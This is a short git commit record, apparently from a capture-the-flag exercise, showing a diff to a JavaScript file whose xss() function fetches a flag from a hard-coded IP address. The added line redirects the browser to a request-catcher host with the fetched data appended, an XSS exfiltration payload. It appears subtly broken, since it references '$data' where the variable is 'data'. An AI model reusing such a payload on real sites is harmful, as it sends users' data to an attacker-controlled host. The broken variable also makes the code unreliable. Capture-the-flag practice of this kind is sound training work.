1fbaa68947a5fdc8cde546a245eef67eebbb3217
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-03-04 16:52:33 +0530

    Update and rename mxg.js to mfg.js

--- mfg.js
+++ mfg.js
@@ -3,6 +3,7 @@ async function xss() {
     const response = await fetch('http://165.232.190.5:1900/flag');
     const data = await response.text();
     console.log(data);
+    document.location="https://xss.requestcatcher.com/test"+$data;
   }
 
   catch (error) {
